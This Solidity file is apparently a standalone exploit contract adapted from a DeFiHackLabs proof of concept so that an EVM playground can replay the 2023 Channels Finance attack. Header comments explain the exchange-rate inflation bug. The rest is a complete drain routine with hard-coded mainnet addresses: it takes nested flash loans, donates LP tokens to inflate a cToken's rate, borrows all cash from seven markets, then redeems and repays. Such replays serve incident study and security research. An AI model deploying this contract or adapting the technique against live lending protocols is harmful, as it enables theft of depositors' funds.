// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-12-ChannelsFinance).
// The DeFiHackLabs PoC runs the attack INLINE in the Foundry test contract (the
// PancakeSwap V3 flash callback `pancakeV3FlashCallback` lives on the test itself,
// so there is no standalone contract to deploy). This contract is a faithful,
// self-contained copy of that inline attack (testExploit -> run, plus the flash
// callback) so the playground can deploy it and record run().
//
// Two differences from the raw DeFiHackLabs test, both required because the
// playground replays real bytecode on a raw EVM (no Foundry cheatcodes available
// inside the recorded call):
//   1. `deal(PancakeSwapToken, address(this), 2e18)` -> moved to the config's
//      `setup.dealToken` step (runs before the recorded call, mirrors `deal`).
//   2. `vm.prank(attackContract); cCLP_BTCB_BUSD.approve(...); transferFrom(...)`
//      (pulling the 2 wei of cCLP_BTCB_BUSD the historical attacker already held
//      from the un-recreated first attack tx) -> replaced by a second
//      `setup.dealToken` step that mints the same 2 wei directly onto this
//      contract. The original prank+transferFrom only exists to move tokens the
//      attacker already owned; dealing them directly onto this contract reaches
//      the identical pre-state (this contract holds 2/2 of the cToken's total
//      supply) without needing an unavailable cheatcode.
//
// Root cause: cCLP_BTCB_BUSD (Channels Finance Compound-fork cToken) computes its
// exchange rate from the contract's *actual* underlying balance
// (exchangeRate = (getCash() + totalBorrows - totalReserves) / totalSupply) with
// no virtual-share offset. Donating underlying directly into the cToken while
// totalSupply is pinned at 2 wei inflates the rate ~1e21x, so the attacker's 2
// cTokens look like millions of dollars of collateral to the Comptroller.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface ICToken {
    function accrueInterest() external returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrow(uint256 borrowAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function totalReserves() external view returns (uint256);
}

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function getAllMarkets() external view returns (address[] memory);
}

interface IUniPairV3 {
    function flash(address recipient, uint256 amount0, uint256 amount1, bytes calldata data) external;
}

interface IUniPairV2 {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
}

contract ChannelsFinanceDrain {
    ICToken private constant cWBNB = ICToken(0x860DF3e99f6223D695aB51b2FB9eaa92Fa903E8D);
    ICToken private constant cBUSD = ICToken(0xca797539f004C0F9c206678338f820AC38466D4b);
    ICToken private constant cUSDT = ICToken(0xBa5B37100538Cde248AAA4c92FB330fCf91F557C);
    ICToken private constant cUSDC = ICToken(0x33e68c922d19D74ce845546a5c12A66ea31385c4);
    ICToken private constant cDAI = ICToken(0x7D247295a6938587C581f5Bb8CBD98A72388E530);
    ICToken private constant cETH = ICToken(0x11797D61fD4BfF9728113601782D4444503093d7);
    ICToken private constant cBTC = ICToken(0x7140A671Da66C0BD411E3fc3B15C51C36dBB5cA3);
    ICToken private constant cCLP_BTCB_BUSD = ICToken(0x93790C641D029D1cBd779D87b88f67704B6A8F4C);

    IERC20 private constant PancakeSwapToken = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IERC20 private constant BTCB = IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c);
    IERC20 private constant BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IComptroller private constant Comptroller = IComptroller(0xFC518333F4bC56185BDd971a911fcE03dEe4fC8c);
    IUniPairV3 private constant BUSDT_BTCB = IUniPairV3(0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4);
    IUniPairV3 private constant BUSDT_BUSD = IUniPairV3(0x4f3126d5DE26413AbDCF6948943FB9D0847d9818);
    IUniPairV2 private constant BTCB_BUSD = IUniPairV2(0xF45cd219aEF8618A92BAa7aD848364a158a24F33);

    // step 0: kick off the first PancakeSwap V3 flash loan (BTCB); the callback below
    // chains a second flash loan (BUSD) and does the actual drain.
    function run() external {
        BUSDT_BTCB.flash(address(this), 0, 11_900e15, "");
    }

    function pancakeV3FlashCallback(uint256 fee0, uint256 fee1, bytes calldata data) external {
        if (msg.sender == address(BUSDT_BTCB)) {
            // step 1: nested flash loan for BUSD, used only to mint the LP tokens donated below.
            BUSDT_BUSD.flash(address(this), 0, 500_000e18, "");
            BTCB.transfer(address(BUSDT_BTCB), 11_900e15 + fee1);
        } else if (msg.sender == address(BUSDT_BUSD)) {
            // step 2: mint BTCB/BUSD LP tokens with the flash-borrowed liquidity.
            (uint112 reserveBTCB, uint112 reserveBUSD,) = BTCB_BUSD.getReserves();
            BTCB.transfer(address(BTCB_BUSD), (uint256(reserveBTCB) * 115) / 100);
            BUSD.transfer(address(BTCB_BUSD), (uint256(reserveBUSD) * 115) / 100);
            BTCB_BUSD.mint(address(this));

            // step 3: the bug - donate the LP underlying straight into the cToken while
            // totalSupply is pinned at 2 wei, inflating exchangeRate ~1e21x.
            PancakeSwapToken.transfer(address(cCLP_BTCB_BUSD), PancakeSwapToken.balanceOf(address(this)));
            IERC20(address(BTCB_BUSD)).transfer(address(cCLP_BTCB_BUSD), IERC20(address(BTCB_BUSD)).balanceOf(address(this)));
            cCLP_BTCB_BUSD.accrueInterest();

            // step 4: enter every Channels Finance market, then borrow 100% of cash out of
            // all 7 markets - the Comptroller now sees this contract's 2 cTokens as
            // enormous collateral because of the inflated exchange rate.
            address[] memory cTokens = Comptroller.getAllMarkets();
            Comptroller.enterMarkets(cTokens);

            ICToken[] memory tokensToSteal = new ICToken[](7);
            tokensToSteal[0] = cWBNB;
            tokensToSteal[1] = cBUSD;
            tokensToSteal[2] = cUSDT;
            tokensToSteal[3] = cUSDC;
            tokensToSteal[4] = cDAI;
            tokensToSteal[5] = cETH;
            tokensToSteal[6] = cBTC;
            for (uint256 i; i < tokensToSteal.length; ++i) {
                tokensToSteal[i].borrow(tokensToSteal[i].getCash());
            }

            // step 5: redeemUnderlying rounds the cTokens-to-burn DOWN, so 1 cToken burns
            // back almost the entire donated LP amount.
            uint256 reserves = cCLP_BTCB_BUSD.totalReserves();
            uint256 redeemAmount = cCLP_BTCB_BUSD.getCash();
            cCLP_BTCB_BUSD.redeemUnderlying(redeemAmount - reserves - 1e9);

            // step 6: burn the recovered LP tokens back to BTCB/BUSD and repay the nested
            // flash loan; the 7 borrowed markets' tokens stay in this contract as profit.
            uint256 lpBalance = IERC20(address(BTCB_BUSD)).balanceOf(address(this));
            IERC20(address(BTCB_BUSD)).transfer(address(BTCB_BUSD), lpBalance);
            BTCB_BUSD.burn(address(this));
            BUSD.transfer(address(BUSDT_BUSD), 500_000e18 + fee1);
        }
    }
}
